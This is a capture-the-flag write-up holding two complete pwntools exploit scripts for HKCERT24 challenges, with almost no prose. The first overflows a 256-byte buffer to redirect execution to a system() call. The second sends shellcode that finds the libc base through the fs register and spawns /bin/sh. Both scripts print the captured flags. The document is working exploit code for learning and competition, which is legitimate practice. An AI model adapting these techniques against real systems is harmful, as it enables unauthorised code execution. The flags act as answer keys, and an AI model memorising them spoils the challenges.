# Chatgtt

Simple pwn:
```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./chal_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
continue
'''

def start():
    if args.REMOTE:
        return remote("c64-chatggt.hkcert24.pwnable.hk", 1337, ssl=True)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return r.recvuntil(d2,drop=True)

#========= exploit here ===================
'''
   0x00000000004011fe <+8>:     lea    rax,[rip+0xe03]        # 0x402008
   0x0000000000401205 <+15>:    mov    rdi,rax
   0x0000000000401208 <+18>:    call   0x4010c0 <system@plt>
'''
payload = b"EXIT"
payload += b"A"*(256-4)
payload += b"BBBBBBBB"
payload += p64(0x4011fe)

sla(b"the chat): ", payload)
#hkcert24{a_v3ry_g00D_star7}
#========= interactive ====================
r.interactive()
```

# Shellcode Revenge 3

Nice Shellcode challenge, managed to learn a new way to leak libc:

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
b *main+364
continue
'''

def start():
    if args.REMOTE:
        return remote("c49-shellcode-runner3.hkcert24.pwnable.hk", 1337, ssl=True)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return r.recvuntil(d2,drop=True)

#========= exploit here ===================
#fs:0x0+0xb20 libc base pointer
payload = asm(f'''
mov rbp, fs:0x0
add rbp, 0x60
mov rsp, rbp
mov r10, fs:0x0
mov r10, [r10+0xb20]
mov rdi, r10
add rdi, {hex(next(libc.search("/bin/sh")))}
add r10, {hex(libc.sym.system)}
xor rsi, rsi
xor rdx, rdx
call r10
''')

sla(b"shellcode here (max: 100):", payload)

#hkcert24{y37_4n07h3r_5h3llc0d3_runn3r_bu7_w17h0u7_54ndb0x}
#========= interactive ====================
r.interactive()
```
